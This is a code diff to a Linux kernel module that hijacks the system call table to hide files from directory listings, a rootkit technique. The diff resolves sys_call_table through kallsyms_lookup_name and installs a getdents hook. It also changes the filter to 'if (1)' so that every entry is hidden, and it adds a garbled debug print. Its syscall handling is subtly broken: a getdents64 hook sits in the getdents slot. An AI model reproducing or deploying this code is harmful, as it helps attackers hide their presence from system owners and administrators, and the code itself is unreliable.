@@ -6,8 +6,9 @@
 #include <linux/semaphore.h>
 #include <linux/dirent.h>
 #include <asm/cacheflush.h>
+#include <linux/kallsyms.h>
 
-MODULE_AUTHOR("0xe7, 0x1e");
+MODULE_AUTHOR("amirreza mirzaei");
 MODULE_DESCRIPTION("Hide a file from getdents syscalls");
 MODULE_LICENSE("GPL");
 
@@ -19,12 +20,14 @@ asmlinkage int (*original_getdents64) (unsigned int fd, struct linux_dirent64 *d
 
 asmlinkage int sys_getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
 {
+	printk("seodoekdoed");
         int rtn;
         struct linux_dirent64 *cur = dirp;
         int i = 0;
         rtn = original_getdents64(fd, dirp, count);
         while (i < rtn) {
-                if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
+		if (1){
+              //  if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
                         int reclen = cur->d_reclen;
                         char *next_rec = (char *)cur + reclen;
                         int len = (int)dirp + rtn - (int)next_rec;
@@ -33,7 +36,7 @@ asmlinkage int sys_getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp,
                         continue;
                 }
                 i += cur->d_reclen;
-                cur = (struct linux_dirent*) ((char*)dirp + i);
+                cur = (struct linux_dirent64*) ((char*)dirp + i);
         }
         return rtn;
 }
@@ -57,19 +60,19 @@ int set_page_ro(unsigned long addr)
 static int __init getdents_hook_init(void)
 {
 
-    sys_call_table = (void*)0xffffffff81e002a0;
-    original_getdents64 = sys_call_table[__NR_getdents64];
+    sys_call_table = (void*)kallsyms_lookup_name("sys_call_table");
+    original_getdents64 = sys_call_table[__NR_getdents];
+
 
     set_page_rw(sys_call_table);
-    sys_call_table[__NR_getdents64] = sys_getdents64_hook;
+    sys_call_table[__NR_getdents] = sys_getdents64_hook;
         return 0;
 }
 
 static void __exit getdents_hook_exit(void)
 {
-    sys_call_table[__NR_getdents64] = original_getdents64;
+    sys_call_table[__NR_getdents] = original_getdents64;
     set_page_ro(sys_call_table);
-        return 0;
 }
 
 module_init(getdents_hook_init);
